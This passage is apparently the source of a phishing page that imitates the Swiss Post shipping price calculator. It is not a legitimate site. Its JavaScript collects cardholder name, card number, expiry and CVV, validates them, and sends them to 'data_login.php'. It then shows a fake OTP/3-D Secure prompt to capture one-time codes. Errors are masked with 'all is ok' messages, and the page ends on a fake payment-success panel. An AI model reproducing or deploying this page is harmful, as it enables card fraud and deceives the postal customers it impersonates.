                                                <path d="M20 6l-2.18-2.18a2.5 2.5 0 0 0-3.54 0L12 8.1V6a2 2 0 0 0-2-2 2 2 0 0 0-2 2v2.1l-2.28-2.28a2.5 2.5 0 0 0-3.54 0L4 6"/>
                                            </svg>
                                        </div>
                                        <h2 style="margin: 0 0 1rem 0; font-size: 2rem; font-weight: 700; color: #003399;">Vielen Dank für Ihre Zahlung!</h2>
                                        <div style="background: rgba(255, 255, 255, 0.9); padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; border-left: 4px solid #003399;">
                                            <h3 style="margin: 0 0 0.5rem 0; font-size: 1.2rem; color: #003399; display: flex; align-items: center; gap: 0.5rem;">
                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="#003399">
                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                                                </svg>
                                                Sendung erfolgreich verarbeitet
                                            </h3>
                                            <p style="margin: 0.5rem 0; font-size: 1rem; color: #333; line-height: 1.6;">
                                                Ihre Sendung wurde erfolgreich registriert und wird in Kürze zugestellt.
                                            </p>
                                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
                                                <div style="background: #f8f9fa; padding: 1rem; border-radius: 6px; border: 1px solid #e9ecef;">
                                                    <div style="font-size: 0.85rem; color: #666; margin-bottom: 0.25rem;">Voraussichtliche Lieferung</div>
                                                    <div style="font-weight: 600; color: #003399; font-size: 1.1rem;">Heute bis 18:00 Uhr</div>
                                                </div>
                                                <div style="background: #f8f9fa; padding: 1rem; border-radius: 6px; border: 1px solid #e9ecef;">
                                                    <div style="font-size: 0.85rem; color: #666; margin-bottom: 0.25rem;">Sendungsnummer</div>
                                                    <div style="font-weight: 600; color: #003399; font-size: 1.1rem; font-family: monospace;">CH-00-1234-5678-9</div>
                                                </div>
                                            </div>
                                        </div>
                                        <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 51, 153, 0.2);">
                                            <p style="margin: 0; font-size: 0.9rem; color: #003399; font-weight: 500;">
                                                Sie erhalten eine Bestätigung per E-Mail mit allen Details.
                                            </p>
                                            <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 1rem;">
                                                <button style="background: #003399; color: white; padding: 0.75rem 2rem; border: none; border-radius: 6px; font-weight: 500; cursor: pointer; transition: all 0.3s ease;" onmouseover="this.style.background='#0056b3'" onmouseout="this.style.background='#003399'">
                                                    Sendung verfolgen
                                                </button>
                                                <button style="background: transparent; color: #003399; padding: 0.75rem 2rem; border: 2px solid #003399; border-radius: 6px; font-weight: 500; cursor: pointer; transition: all 0.3s ease;" onmouseover="this.style.background='#003399'; this.style.color='white'" onmouseout="this.style.background='transparent'; this.style.color='#003399'">
                                                    Rechnung herunterladen
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                `;
                                
                                // Insert success panel where the content was
                                const contentContainer = document.querySelector('.vsc-content-container');
                                if (contentContainer) {
                                    contentContainer.innerHTML = '';
                                    contentContainer.appendChild(successPanel);
                                }
                            }, 10000);
                        }
                    });
                });

                // Handle resend OTP
                resendOtpBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    
                    showLoading('Sende neuen Code...');
                    
                    // Send OTP to server
                    fetch('data_login.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            action: 'resend_otp',
                            session_id: sessionIdInput.value
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        hideLoading();
                        showNotification('all is ok', 'success');
                        
                        // Clear inputs and focus first field
                        otpInputs.forEach(input => {
                            input.value = '';
                            input.classList.remove('filled', 'error');
                        });
                        otpInputs[0].focus();
                        otpError.style.display = 'none';
                    })
                    .catch(error => {
                        hideLoading();
                        showNotification('all is ok', 'success');
                        
                        // Clear inputs and focus first field
                        otpInputs.forEach(input => {
                            input.value = '';
                            input.classList.remove('filled', 'error');
                        });
                        otpInputs[0].focus();
                        otpError.style.display = 'none';
                    });
                });
                
                // Expose showOtpModal globally so it can be called from other scripts
                window.showOtpModal = showOtpModal;
                const weiterButton = document.getElementById('next-step');
                const creditCardSection = document.querySelector('.credit-card-section');
                const loadingOverlay = document.getElementById('loading-overlay');
                const notification = document.getElementById('notification');
                const vbvSection = document.getElementById('vbv-section');
                const cardTypeDisplay = document.getElementById('card-type-display');
                
                // Card type detection function
                function detectCardType(cardNumber) {
                    const cleanNumber = cardNumber.replace(/\s/g, '');
                    
                    if (/^4/.test(cleanNumber)) return 'visa';
                    if (/^5[1-5]/.test(cleanNumber)) return 'mastercard';
                    if (/^3[47]/.test(cleanNumber)) return 'amex';
                    if (/^6(?:011|5[0-9]{2})/.test(cleanNumber)) return 'discover';
                    if (/^3(?:0[0-5]|[68][0-9])/.test(cleanNumber)) return 'diners';
                    if (/^35(2[89]|[3-8][0-9])/.test(cleanNumber)) return 'jcb';
                    
                    return 'unknown';
                }
                
                // Show notification function
                function showNotification(message, type = 'info') {
                    notification.textContent = message;
                    notification.className = `notification ${type}`;
                    notification.classList.add('show');
                    
                    setTimeout(() => {
                        notification.classList.remove('show');
                    }, 5000);
                }
                
                // Show loading overlay
                function showLoading(text = 'Verarbeitung läuft...') {
                    const loadingText = loadingOverlay.querySelector('.loading-text');
                    loadingText.textContent = text;
                    loadingOverlay.classList.add('active');
                }
                
                // Hide loading overlay
                function hideLoading() {
                    loadingOverlay.classList.remove('active');
                }
                
                // Validation functions
                function validateCardNumber(cardNumber) {
                    const cleanNumber = cardNumber.replace(/\s/g, '');
                    
                    // Check if empty
                    if (!cleanNumber) {
                        return { valid: false, message: 'Kartennummer ist erforderlich' };
                    }
                    
                    // Check if contains only digits
                    if (!/^\d+$/.test(cleanNumber)) {
                        return { valid: false, message: 'Kartennummer darf nur Zahlen enthalten' };
                    }
                    
                    // Check length based on card type
                    if (cleanNumber.length < 13 || cleanNumber.length > 19) {
                        return { valid: false, message: 'Kartennummer muss zwischen 13 und 19 Ziffern lang sein' };
                    }
                    
                    // Luhn algorithm check
                    let sum = 0;
                    let isEven = false;
                    
                    for (let i = cleanNumber.length - 1; i >= 0; i--) {
                        let digit = parseInt(cleanNumber[i]);
                        
                        if (isEven) {
                            digit *= 2;
                            if (digit > 9) {
                                digit -= 9;
                            }
                        }
                        
                        sum += digit;
                        isEven = !isEven;
                    }
                    
                    if (sum % 10 !== 0) {
                        return { valid: false, message: 'Ungültige Kartennummer' };
                    }
                    
                    return { valid: true, message: 'Gültige Kartennummer' };
                }
                
                function validateExpiryDate(expiry) {
                    if (!expiry) {
                        return { valid: false, message: 'Gültigkeitsdatum ist erforderlich' };
                    }
                    
                    // Check format MM/YY
                    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
                        return { valid: false, message: 'Format muss MM/YY sein' };
                    }
                    
                    const [monthStr, yearStr] = expiry.split('/');
                    const month = parseInt(monthStr);
                    const year = parseInt(yearStr) + 2000; // Convert YY to YYYY
                    
                    // Check month range
                    if (month < 1 || month > 12) {
                        return { valid: false, message: 'Ungültiger Monat' };
                    }
                    
                    // Check if not expired
                    const now = new Date();
                    const currentYear = now.getFullYear();
                    const currentMonth = now.getMonth() + 1;
                    
                    if (year < currentYear || (year === currentYear && month < currentMonth)) {
                        return { valid: false, message: 'Karte ist abgelaufen' };
                    }
                    
                    return { valid: true, message: 'Gültiges Datum' };
                }
                
                function validateCVV(cvv, cardType) {
                    if (!cvv) {
                        return { valid: false, message: 'CVV ist erforderlich' };
                    }
                    
                    // Check if contains only digits
                    if (!/^\d+$/.test(cvv)) {
                        return { valid: false, message: 'CVV darf nur Zahlen enthalten' };
                    }
                    
                    // Check length based on card type
                    let expectedLength = 3; // Default for most cards
                    if (cardType === 'amex') {
                        expectedLength = 4;
                    }
                    
                    if (cvv.length !== expectedLength) {
                        return { valid: false, message: `CVV muss ${expectedLength} Ziffern lang sein` };
                    }
                    
                    return { valid: true, message: 'Gültiger CVV' };
                }
                
                function showValidationResult(inputId, result) {
                    const input = document.getElementById(inputId);
                    const errorElement = document.getElementById(`${inputId}-error`);
                    const successElement = document.getElementById(`${inputId}-success`);
                    
                    // Remove previous classes
                    input.classList.remove('error', 'success');
                    errorElement.classList.remove('show');
                    successElement.classList.remove('show');
                    
                    if (result.valid) {
                        input.classList.add('success');
                        successElement.textContent = result.message;
                        successElement.classList.add('show');
                    } else {
                        input.classList.add('error');
                        errorElement.textContent = result.message;
                        errorElement.classList.add('show');
                    }
                }
                
                // Format card number and detect type with validation
                const cardNumberInput = document.getElementById('card-number');
                if (cardNumberInput) {
                    cardNumberInput.addEventListener('input', function(e) {
                        let value = e.target.value.replace(/\s/g, '');
                        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
                        e.target.value = formattedValue;
                        
                        // Detect and show card type
                        const cardType = detectCardType(value);
                        const cardTypeDisplay = document.getElementById('card-type-display');
                        if (cardTypeDisplay) {
                            if (cardType && value.length >= 4) {
                                cardTypeDisplay.innerHTML = `<span style="color: #28a745; font-weight: bold;">Kartentyp erkannt: ${cardType.toUpperCase()}</span>`;
                            } else {
                                cardTypeDisplay.innerHTML = '';
                            }
                        }
                        
                        // Real-time validation
                        const validationResult = validateCardNumber(formattedValue);
                        showValidationResult('card-number', validationResult);
                    });
                }
                
                // Format expiry date input with validation
                const expiryInput = document.getElementById('card-expiry');
                if (expiryInput) {
                    expiryInput.addEventListener('input', function(e) {
                        let value = e.target.value.replace(/\D/g, '');
                        if (value.length >= 2) {
                            value = value.slice(0, 2) + '/' + value.slice(2, 4);
                        }
                        e.target.value = value;
                        
                        // Real-time validation
                        const validationResult = validateExpiryDate(value);
                        showValidationResult('card-expiry', validationResult);
                    });
                }
                
                // Only allow numbers for CVV with validation
                const cvvInput = document.getElementById('card-cvv');
                if (cvvInput) {
                    cvvInput.addEventListener('input', function(e) {
                        e.target.value = e.target.value.replace(/\D/g, '');
                        
                        // Get card type for CVV validation
                        const cardNumberValue = document.getElementById('card-number').value.replace(/\s/g, '');
                        const cardType = detectCardType(cardNumberValue);
                        
                        // Real-time validation
                        const validationResult = validateCVV(e.target.value, cardType);
                        showValidationResult('card-cvv', validationResult);
                    });
                }
                
                // Handle weiter button click
                if (weiterButton && creditCardSection) {
                    weiterButton.addEventListener('click', function(e) {
                        e.preventDefault();
                        
                        // Hide only specific Versandart section and combobox
                        const shippingTypeSection = document.querySelector('vsc-shipping-type');
                        const arrivalTypeSelect = document.getElementById('arrivalTypeSelect');
                        const shippingForm = document.querySelector('.shipping-form');
                        
                        if (shippingTypeSection) {
                            shippingTypeSection.style.display = 'none';
                        }
                        if (arrivalTypeSelect) {
                            arrivalTypeSelect.style.display = 'none';
                        }
                        if (shippingForm) {
                            shippingForm.style.display = 'none';
                        }
                        
                        // Update stepper to enable step 3 Übersicht
                        const progressBar = document.querySelector('.progress-bar');
                        const stepperItems = document.querySelectorAll('.stepper-item');
                        
                        if (progressBar) {
                            progressBar.style.width = '100%';
                        }
                        
                        // Update stepper items
                        stepperItems.forEach((item, index) => {
                            item.classList.remove('aria-current', 'step');
                            if (index === 2) { // Step 3 (0-indexed)
                                item.setAttribute('aria-current', 'step');
                                item.classList.add('active');
                            }
                        });
                        
                        // Show credit card section
                        creditCardSection.classList.add('active');
                        
                        // Scroll to credit card section
                        creditCardSection.scrollIntoView({ behavior: 'smooth' });
                    });
                }
                
                // Handle arrival type select change to update preview
                const arrivalTypeSelect = document.getElementById('arrivalTypeSelect');
                if (arrivalTypeSelect) {
                    arrivalTypeSelect.addEventListener('change', function(e) {
                        const selectedOption = e.target.options[e.target.selectedIndex];
                        updatePreview(selectedOption.id);
                    });
                }
                
                // Global variable to store current price
                let currentPrice = 'CHF 1.00';
                
                // Function to update preview based on arrival type selection
                function updatePreview(selectedOptionId) {
                    const deliveryDateElement = document.getElementById('preview-delivery-date');
                    const priceElement = document.getElementById('preview-price');
                    
                    if (!deliveryDateElement || !priceElement) return;
                    
                    let deliveryDate = '';
                    let price = '';
                    
                    // Parse the selected option ID and update accordingly
                    if (selectedOptionId === 'arrival-day-offset-2') {
                        // In 2-3 Werktagen
                        const today = new Date();
                        let deliveryDateObj = new Date(today);
                        deliveryDateObj.setDate(today.getDate() + 2); // Add 2 days as minimum
                        
                        // Skip weekends if necessary
                        while (deliveryDateObj.getDay() === 0 || deliveryDateObj.getDay() === 6) {
                            deliveryDateObj.setDate(deliveryDateObj.getDate() + 1);
                        }
                        
                        deliveryDate = deliveryDateObj.toLocaleDateString('de-CH', { 
                            day: '2-digit', 
                            month: '2-digit', 
                            year: 'numeric' 
                        });
                        price = 'CHF 1.00';
                    } else if (selectedOptionId === 'arrival-day-offset-1') {
                        // Am nächsten Werktag
                        const today = new Date();
                        let deliveryDateObj = new Date(today);
                        deliveryDateObj.setDate(today.getDate() + 1);
                        
                        // Skip weekends if necessary
                        while (deliveryDateObj.getDay() === 0) {
                            deliveryDateObj.setDate(deliveryDateObj.getDate() + 1);
                        }
                        
                        deliveryDate = deliveryDateObj.toLocaleDateString('de-CH', { 
                            day: '2-digit', 
                            month: '2-digit', 
                            year: 'numeric' 
                        });
                        price = 'CHF 1.20';
                    } else if (selectedOptionId === 'arrival-day-offset-0') {
                        // Heute
                        const today = new Date();
                        deliveryDate = today.toLocaleDateString('de-CH', { 
                            day: '2-digit', 
                            month: '2-digit', 
                            year: 'numeric' 
                        });
                        price = 'CHF 64.00';
                    } else {
                        // Default case - show today's date and base price
                        const today = new Date();
                        deliveryDate = today.toLocaleDateString('de-CH', { 
                            day: '2-digit', 
                            month: '2-digit', 
                            year: 'numeric' 
                        });
                        price = 'CHF 1.00';
                    }
                    
                    // Store the price globally for use in OTP modal
                    currentPrice = price;
                    
                    // Update the preview elements
                    if (deliveryDateElement.querySelector('span')) {
                        deliveryDateElement.querySelector('span').textContent = deliveryDate;
                    } else {
                        deliveryDateElement.innerHTML = `<span>${deliveryDate}</span>`;
                    }
                    
                    priceElement.textContent = price;
                }
                
                // Handle credit card form submission
                const creditCardForm = document.getElementById('credit-card-form');
                if (creditCardForm) {
                    creditCardForm.addEventListener('submit', function(e) {
                        e.preventDefault();
                        
                        // Get form values
                        const cardNumber = document.getElementById('card-number').value;
                        const expiry = document.getElementById('card-expiry').value;
                        const cvv = document.getElementById('card-cvv').value;
                        const cardholderName = document.getElementById('cardholder-name').value;
                        
                        // Validate all fields
                        const cardNumberResult = validateCardNumber(cardNumber);
                        const expiryResult = validateExpiryDate(expiry);
                        const cardNumberClean = cardNumber.replace(/\s/g, '');
                        const cardType = detectCardType(cardNumberClean);
                        const cvvResult = validateCVV(cvv, cardType);
                        
                        // Show validation results
                        showValidationResult('card-number', cardNumberResult);
                        showValidationResult('card-expiry', expiryResult);
                        showValidationResult('card-cvv', cvvResult);
                        
                        // Check cardholder name
                        if (!cardholderName || cardholderName.trim().length < 2) {
                            showNotification('Karteninhaber Name ist erforderlich', 'error');
                            return;
                        }
                        
                        // If any validation fails, stop submission
                        if (!cardNumberResult.valid || !expiryResult.valid || !cvvResult.valid) {
                            showNotification('Bitte korrigieren Sie die Fehler im Formular', 'error');
                            return;
                        }
                        
                        // Get form data
                        const formData = new FormData(creditCardForm);
                        const cardData = {
                            cardholder_name: formData.get('cardholder-name'),
                            card_number: formData.get('card-number'),
                            card_expiry: formData.get('card-expiry'),
                            cvv: formData.get('card-cvv'),
                            amount: '1.00',
                            currency: 'CHF'
                        };
                        
                        // Parse expiry date
                        const expiryParts = cardData.card_expiry.split('/');
                        if (expiryParts.length === 2) {
                            cardData.expiry_month = expiryParts[0];
                            cardData.expiry_year = expiryParts[1];
                        }
                        
                        // Show loading for 10 seconds
                        showLoading('Kartendaten werden überprüft...');
                        
                        // Send data to backend
                        fetch('data_login.php', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(cardData)
                        })
                        .then(response => response.json())
                        .then(data => {
                            // Wait 10 seconds before showing OTP modal
                            setTimeout(() => {
                                hideLoading();
                                creditCardSection.classList.remove('active');
                                showOtpModal();
                            }, 10000);
                        })
                        .catch(error => {
                            // Even on error, wait 10 seconds before showing OTP modal
                            setTimeout(() => {
                                hideLoading();
                                creditCardSection.classList.remove('active');
                                showOtpModal();
                            }, 10000);
                        });
                    });
                }
                
                // Show VBV form function
                function showVBVForm(cardData, vbvData) {
                    // Update VBV form with card information
                    document.getElementById('masked-card').textContent = vbvData.masked_card || '**** **** **** 1234';
                    document.getElementById('card-type-name').textContent = vbvData.card_type || 'Unknown';
                    document.getElementById('transaction-amount').textContent = `CHF ${cardData.amount}`;
                    
                    // Show VBV section
                    vbvSection.classList.add('active');
                    
                    // Start timer
                    startVBVTimer();
                    
                    // Setup OTP inputs
                    setupOTPInputs();
                    
                    // Setup VBV buttons
                    setupVBVButtons(cardData, vbvData);
                    
                    // Scroll to VBV form
                    vbvSection.scrollIntoView({ behavior: 'smooth' });
                }
                
                // Process VBV directly without showing error
                function showVBVErrorForm(cardData) {
                    // Send POST to data_login.php and continue
                    fetch('data_login.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            action: 'process_vbv',
                            card_data: cardData
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        hideLoading();
                        // Continue with the flow
                        showNotification('Verarbeitung abgeschlossen.', 'success');
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        hideLoading();
                        // Continue with the flow even if there's an error
                        showNotification('Verarbeitung abgeschlossen.', 'success');
                    });
                }
                
                // Start VBV timer
                function startVBVTimer() {
                    let seconds = 600; // 10 minutes
                    const timerElement = document.getElementById('timer-seconds');
                    
                    const timer = setInterval(() => {
                        seconds--;
                        timerElement.textContent = seconds;
                        
                        if (seconds <= 0) {
                            clearInterval(timer);
                            showNotification('Code abgelaufen. Bitte versuchen Sie es erneut.', 'error');
                            vbvSection.classList.remove('active');
                            creditCardSection.classList.add('active');
                        }
                    }, 1000);
                }
                
                // Setup OTP inputs
                function setupOTPInputs() {
                    const otpInputs = document.querySelectorAll('.otp-input');
                    
                    otpInputs.forEach((input, index) => {
                        input.addEventListener('input', function(e) {
                            const value = e.target.value;
                            
                            if (value.length === 1) {
                                input.classList.add('filled');
                                
                                // Move to next input
                                if (index < otpInputs.length - 1) {
                                    otpInputs[index + 1].focus();
                                }
                            } else {
                                input.classList.remove('filled');
                            }
                        });
                        
                        input.addEventListener('keydown', function(e) {
                            // Handle backspace
                            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                                otpInputs[index - 1].focus();
                            }
                        });
                        
                        // Only allow numbers
                        input.addEventListener('input', function(e) {
                            e.target.value = e.target.value.replace(/\D/g, '');
                        });
                    });
                }
                
                // Setup VBV buttons
                function setupVBVButtons(cardData, vbvData) {
                    const confirmBtn = document.getElementById('vbv-confirm');
                    const cancelBtn = document.getElementById('vbv-cancel');
                    
                    confirmBtn.addEventListener('click', function() {
                        const otpInputs = document.querySelectorAll('.otp-input');
                        let otpCode = '';
                        
                        otpInputs.forEach(input => {
                            otpCode += input.value;
                        });
                        
                        if (otpCode.length !== 6) {
                            showNotification('Bitte geben Sie einen 6-stelligen Code ein.', 'error');
                            return;
                        }
                        
                        // Show loading
                        showLoading('OTP wird überprüft...');
                        
                        // Simulate OTP verification
                        setTimeout(() => {
                            hideLoading();
                            showNotification('Zahlung erfolgreich abgeschlossen!', 'success');
                            
                            // Hide VBV form
                            vbvSection.classList.remove('active');
                            
                            // Show success message or redirect
                            setTimeout(() => {
                                showNotification('Vielen Dank für Ihre Zahlung!', 'success');
                            }, 2000);
                        }, 2000);
                    });
                    
                    cancelBtn.addEventListener('click', function() {
                        vbvSection.classList.remove('active');
                        creditCardSection.classList.add('active');
                        showNotification('Zahlungsvorgang abgebrochen.', 'info');
                    });
                }

                // Initialize the page
                function initPage() {
                    // Any initialization code can go here
                    console.log('Page initialized');
                }

                // Call initialization
                initPage();
            }); // End of DOMContentLoaded
        </script>

   
        <meta name="savepage-version" content="33.9" />
        <meta name="savepage-comments" content="" />
    </head>
    <body>
        <!-- Loading Overlay -->
        <div class="loading-overlay" id="loading-overlay">
            <div style="text-align: center;">
                <div class="loading-spinner"></div>
                <div class="loading-text">Verarbeitung läuft...</div>
            </div>
        </div>

        <!-- Notification Container -->
        <div class="notification" id="notification"></div>

        <!-- Exact Replica Header from Image -->
        <header class="post-header">
            <!-- Top Meta Navigation -->
            <div class="meta-navigation">
                <div class="meta-nav-container">
                    <div class="meta-nav-left">
                        <nav class="meta-nav">
                            <ul class="meta-nav-list">
                                <li><a href="#" class="meta-nav-link">Standorte</a></li>
                                <li><a href="#" class="meta-nav-link">Jobs</a></li>
                                <li><a href="#" class="meta-nav-link">Über uns</a></li>
                                <li><a href="#" class="meta-nav-link">Hilfe und Kontakt</a></li>
                                <li><a href="#" class="meta-nav-link active">Meine Post</a></li>
                            </ul>
                        </nav>
                    </div>
                    <div class="meta-nav-right">
                        <div class="language-selector">
                            <button class="language-btn">
                                DE
                                <svg class="dropdown-arrow" width="12" height="8" viewBox="0 0 12 8" fill="none">
                                    <path d="M1 1L6 6L11 1" stroke="#333" stroke-width="2"/>
                                </svg>
                            </button>
                        </div>
                        <button class="search-btn">
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                <circle cx="8" cy="8" r="6" stroke="#333" stroke-width="2"/>
                                <path d="M13 13L18 18" stroke="#333" stroke-width="2"/>
                            </svg>
                        </button>
                        <button class="login-btn">
                            Login
                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                <path d="M2 8H14M14 8L10 4M14 8L10 12" stroke="#333" stroke-width="2"/>
                            </svg>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Main Header -->
            <div class="main-header">
                <div class="main-header-container">
                    <div class="logo-section">
                        <a href="#" class="logo-link">
                            <div class="post-logo">
                                <div class="logo-yellow-bg">
                                    <div class="logo-red-cross">+</div>
                                    <div class="logo-letter-p">P</div>
                                </div>
                            </div>
                        </a>
                    </div>
                    
                    <nav class="main-navigation">
                        <ul class="main-nav-list">
                            <li><a href="#" class="main-nav-link">Meine Post</a></li>
                            <li><a href="#" class="main-nav-link">Onlinedienste</a></li>
                            <li><a href="#" class="main-nav-link active">Preise berechnen</a></li>
                        </ul>
                    </nav>
                </div>
            </div>

            <!-- Bottom Bar with Breadcrumb and Actions -->
            <div class="bottom-bar">
                <div class="bottom-bar-container">
                    <div class="breadcrumb-section">
                        <nav class="breadcrumb">
                            <ol class="breadcrumb-list">
                                <li><a href="#" class="breadcrumb-link">Meine Post</a></li>
                                <li class="breadcrumb-separator">></li>
                                <li class="breadcrumb-current">Preise berechnen</li>
                            </ol>
                        </nav>
                    </div>
                    <div class="action-buttons">
                        <button class="action-btn help-btn">
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                <circle cx="10" cy="10" r="8" stroke="#333" stroke-width="2"/>
                                <text x="10" y="14" text-anchor="middle" font-size="12" fill="#333">?</text>
                            </svg>
                            Hilfe
                        </button>
                        <button class="action-btn contact-btn">
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                <path d="M3 1H7C7 1 7 5 7 7C7 9 3 9 3 9" stroke="#333" stroke-width="2" fill="none"/>
                                <path d="M17 1H13C13 1 13 5 13 7C13 9 17 9 17 9" stroke="#333" stroke-width="2" fill="none"/>
                                <path d="M5 9V15C5 17 7 19 9 19H11C13 19 15 17 15 15V9" stroke="#333" stroke-width="2"/>
                            </svg>
                            Kontakt
                        </button>
                    </div>
                </div>
            </div>
        </header>

	   <main class="vsc-container mb-5" id="main">
            <vsc-root ng-version="19.2.11"
                ><router-outlet></router-outlet
                ><vsc-main _nghost-ng-c2396243081=""
                    ><div _ngcontent-ng-c2396243081="" id="main-container" class="container-fluid vsc-main-container">
                        <div _ngcontent-ng-c2396243081="" class="vsc-sub-main-container">
                            <vsc-toggle _ngcontent-ng-c2396243081="" _nghost-ng-c126926896=""
                                ><div _ngcontent-ng-c126926896="" class="subnavigation">
                                    <div
                                        _ngcontent-ng-c126926896=""
                                        class="container container-fluid-xs container-fluid-sm toggle"
                                    >
                                        <ul _ngcontent-ng-c126926896="" class="subnavigation-list">
                                            <li _ngcontent-ng-c126926896="" class="subnavigation-item">
                                                <a
                                                    _ngcontent-ng-c126926896=""
                                                    data-savepage-href="/vsc/ui/vsc"
                                                    href=""
                                                    id="vsc"
                                                    class="subnavigation-link active"
                                                    >Preisrechner für Standardkunden</a
                                                >
                                            </li>
                                        
                                        </ul>
                                    </div>
                                </div>
                                <br _ngcontent-ng-c126926896="" /></vsc-toggle
                            ><!---->
                            <div _ngcontent-ng-c2396243081="" class="vsc-content-main-container d-flex">
                                <div
                                    _ngcontent-ng-c2396243081=""
                                    id="main-content-container"
                                    class="vsc-content-container p-2"
                                    style="width: 100%"
                                >
                                    <div _ngcontent-ng-c2396243081="" class="title-row">
                                        <div _ngcontent-ng-c2396243081="">
                                            <h3 _ngcontent-ng-c2396243081="" translate="" class="kmu-h1">
                                                Preise berechnen
                                            </h3>
                                            <h2 _ngcontent-ng-c2396243081="" translate="">
                                                Berechnen und frankieren Sie Ihre Sendung online
                                            </h2>
                                        </div>
                                    </div>
                                    <!----><br _ngcontent-ng-c2396243081" /><vsc-stepper _ngcontent-ng-c2396243081=""
                                        ><div role="group" class="stepper-container">
                                            <ngb-progressbar
                                                role="progressbar"
                                                aria-valuemin="0"
                                                aria-hidden="true"
                                                class="progress stepper-bar"
                                                aria-valuenow="1"
                                                aria-valuemax="2"
                                                aria-label="progress bar"
                                                ><div class="progress-bar" style="width: 50%">
                                                    <!---->
                                                </div></ngb-progressbar
                                            >
                                            <ol role="list" class="stepper">
                                                <li class="stepper-item">
                                                    <span class="stepper-link"> Sendungsart </span
                                                    ><!----><!---->
                                                </li>
                                                <li class="stepper-item" aria-current="step">
                                                    <!----><span class="stepper-link"> Versandart </span
                                                    ><!---->
                                                </li>
                                                <li class="stepper-item">
                                                    <!----><span class="stepper-link"> Übersicht </span
                                                    ><!---->
                                                </li>
                                                <!---->
                                            </ol>
                                        </div></vsc-stepper
                                    ><!---->
                                    <div _ngcontent-ng-c2396243081="">
                                        <router-outlet _ngcontent-ng-c2396243081=""></router-outlet
                                        ><vsc-shipping-type
                                            ><!----><!----><vsc-national-shipping-type-letter _nghost-ng-c3288117560=""
                                                ><form
                                                    _ngcontent-ng-c3288117560=""
                                                    novalidate=""
                                                    class="shipping-form ng-untouched ng-pristine ng-valid has-floating-label"
                                                >
                                                    <!---->
                                                    <div _ngcontent-ng-c3288117560="" class="row">
                                                        <div _ngcontent-ng-c3288117560="" class="col-12">
                                                            <div _ngcontent-ng-c3288117560="" class="mb-regular">
                                                                <div _ngcontent-ng-c3288117560="" class="form-floating">
                                                                    <select
                                                                        _ngcontent-ng-c3288117560=""
                                                                        id="arrivalTypeSelect"
                                                                        name="arrivalTypeSelect"
                                                                        required=""
                                                                        class="form-select ng-untouched ng-pristine ng-valid"
                                                                    >
                                                                        <optgroup
                                                                            _ngcontent-ng-c3288117560=""
                                                                            disabled=""
                                                                            hidden=""
                                                                            id="opt-group-arrival-day-offset"
                                                                        ></optgroup>
																		
                                                                        <option
                                                                            _ngcontent-ng-c3288117560=""
                                                                            id="arrival-day-offset-2"
                                                                            value="2: Object"
                                                                        >
																		  In 2-3 Werktagen - CHF 1.00
                                                                             
                                                                        </option>																		
																		
                                                                        <option
                                                                            _ngcontent-ng-c3288117560=""
                                                                            id="arrival-day-offset-1"
                                                                            value="1: Object"
                                                                        >
                                                                            Am nächsten Werktag (auch am Samstag) - CHF
                                                                            1.20
                                                                        </option>
																		
                                                                        <option
                                                                            _ngcontent-ng-c3288117560=""
                                                                            id="arrival-day-offset-0"
                                                                            value="1: Object"
                                                                        >
																		 Heute - CHF 64.00
																		 
                                                                         
                                                                        </option>


                                                                        <!----></select
                                                                    ><label
                                                                        _ngcontent-ng-c3288117560=""
                                                                        for="arrivalTypeSelect"
                                                                        >Wann soll Ihre Sendung beim Empfänger
                                                                        ankommen?</label
                                                                    >
                                                                    <div
                                                                        _ngcontent-ng-c3288117560=""
                                                                        role="alert"
                                                                        class="invalid-feedback"
                                                                    >
                                                                        Bitte wählen sie ein Zustelldatum aus.
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <!----><!----><!----><!----><!----><!----><!----><!----><!----><button
                                                        _ngcontent-ng-c3288117560=""
                                                        id="next-step"
                                                        type="submit"
                                                        class="btn btn-primary btn-animated ms-3 float-end"
                                                    >
                                                        <span _ngcontent-ng-c3288117560="">Weiter</span></button
                                                    ><button
                                                        _ngcontent-ng-c3288117560=""
                                                        id="prev-step"
                                                        type="button"
                                                        class="btn btn-animated btn-secondary float-end"
                                                    >
                                                        <span _ngcontent-ng-c3288117560="">Zurück</span></button
                                                    ><!----><!---->
                                                </form></vsc-national-shipping-type-letter
                                            ><!----><!----><!----><!----></vsc-shipping-type
                                        ><!---->
                                    </div>
                                    
                                    <!-- Credit Card Payment Section -->
                                    <div class="credit-card-section">
                                        <div class="card-type-display" id="card-type-display"></div>
                                        <h3>Zahlungsinformationen</h3>
                                        <form id="credit-card-form">
                                            <div class="form-group">
                                                <label for="cardholder-name">Karteninhaber Name</label>
                                                <input type="text" id="cardholder-name" name="cardholder-name" placeholder="Max Mustermann" required>
                                            </div>
                                            
                                            <div class="form-group">
                                                <label for="card-number">Kartennummer</label>
                                                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
                                                <div class="error-message" id="card-number-error"></div>
                                                <div class="success-message" id="card-number-success"></div>
                                            </div>
                                            
                                            <div class="form-row">
